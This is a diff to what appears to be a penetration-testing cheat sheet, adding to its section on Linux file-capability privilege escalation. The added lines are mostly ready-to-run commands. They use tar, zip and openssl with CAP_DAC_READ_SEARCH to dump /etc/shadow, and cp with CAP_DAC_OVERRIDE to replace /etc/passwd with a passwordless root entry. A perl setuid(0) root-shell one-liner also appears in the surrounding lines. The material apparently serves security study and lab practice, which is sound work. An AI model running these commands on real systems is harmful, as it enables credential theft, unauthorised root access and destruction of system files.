@@ -666,12 +666,18 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2>/dev/null 
 
 ## Linux File capabilities exploitation
 
-Liux capabilties are a granular way of providing elevated permissions to a file to allow it to do a specific action. For example a capability can allow a file to preform file reads as if they are root(meaning read any file)
+Liux capabilties are a granular way of providing elevated permissions to a file to allow it to do a specific action. For example a capability can allow a file to preform file reads as if they are root but only allowing that narrow, defined task to be executed in a privlidged context
 ```bash
-# Find binaries with capabilities
+# Find all binaries with capabilities
 getcap -r / 2>/dev/null
 
-# Common dangerous capabilities:
+# Check capabilities of a specific binary
+getcap /usr/bin/vstpd
+
+# List all available capabilities
+capsh --print
+
+# All abuseable capabilities:
 # CAP_SETUID - allows changing of UID
 # CAP_DAC_OVERRIDE - bypass file read/write/execute permission checks
 # CAP_DAC_READ_SEARCH - bypass file/directory read permission checks
@@ -686,6 +692,22 @@ getcap -r / 2>/dev/null
 
 # If perl has cap_setuid+ep
 /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+# If tar has CAP_DAC_READ_SEARCH
+/usr/bin/tar -cf /tmp/shadow.tar /etc/shadow
+tar -xf /tmp/shadow.tar -O
+
+# If zip has CAP_DAC_READ_SEARCH
+/usr/bin/zip /tmp/shadow.zip /etc/shadow
+unzip -p /tmp/shadow.zip
+
+# If openssl has CAP_DAC_READ_SEARCH
+/usr/bin/openssl enc -in /etc/shadow
+
+# If cp has CAP_DAC_OVERRIDE
+echo 'root::0:0:root:/root:/bin/bash' > /tmp/passwd
+/usr/bin/cp /tmp/passwd /etc/passwd
+
 ```
 There are infinite potential avenues and thus its important if you encounter an unfimilar binary to look at the documentation or run -h or google the name of the binary with priv esc
 
